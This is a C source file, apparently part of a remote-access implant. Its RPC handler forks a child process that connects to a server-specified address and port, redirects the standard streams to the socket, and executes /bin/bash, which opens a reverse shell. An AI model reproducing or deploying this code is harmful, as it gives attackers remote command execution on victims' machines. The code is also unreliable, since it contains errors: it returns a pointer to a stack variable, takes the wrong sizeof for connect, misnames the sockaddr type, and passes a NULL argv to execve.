#include "rpc/methods/shell/shell.h"

struct RPCShell shell_serialize(const struct RPC *rpc);
struct sock_addr* get_address(const struct RPCShell shell);
/**
 * @brief This is an RPC function, this function is used to connect to a reverse shell in new process.
 * 
 * @param rpc The message the server sent. 
 * @return int The return error 0 on success negative 1 on failure.
 */
int rpc_shell(const struct RPC rpc) {
    int child_pid = fork();

    printf("child_pid: %d\n", child_pid);
    // checking whether its the parent process.
    if (child_pid > 0) {
        return 0;
    } else if(child_pid < 0) { // making sure the fork syscall didn't returned any errors.
        return -1;
    }

    printf("The child is printing\n");

    struct RPCShell shell = shell_serialize(&rpc);

    printf("%d %s\n", shell.port, shell.address);

    struct sock_addr* address = get_address(shell);
    int sockfd = socket(AF_INET, SOCK_STREAM,  0);
    printf("%d \n", sizeof(address));
    connect(sockfd, address, sizeof(&address));

    for (int i = 0; i < 3; i++) {
        dup2(sockfd, i);
    }

    execve("/bin/bash", NULL, NULL);

    return 0;
}

/**
 * @brief the serialize function from an RPC struct into shell struct.
 * 
 * @param rpc The bytes the server sent. 
 * @return struct Shell the serialized object.
 */
struct RPCShell shell_serialize(const struct RPC *rpc) {
    struct RPCShell *shell = (struct RPC *) rpc;

    return *shell;
}


/**
 * @brief Get the address object
 * 
 * @param shell 
 * @return struct sock_addr* 
 */
struct sock_addr* get_address(const struct RPCShell shell) {
    struct sockaddr_in addr;

    addr.sin_family = AF_INET;
    addr.sin_port = htons(shell.port);
    
    inet_aton(shell.address, &addr.sin_addr);

    return (struct sock_addr *) &addr;
}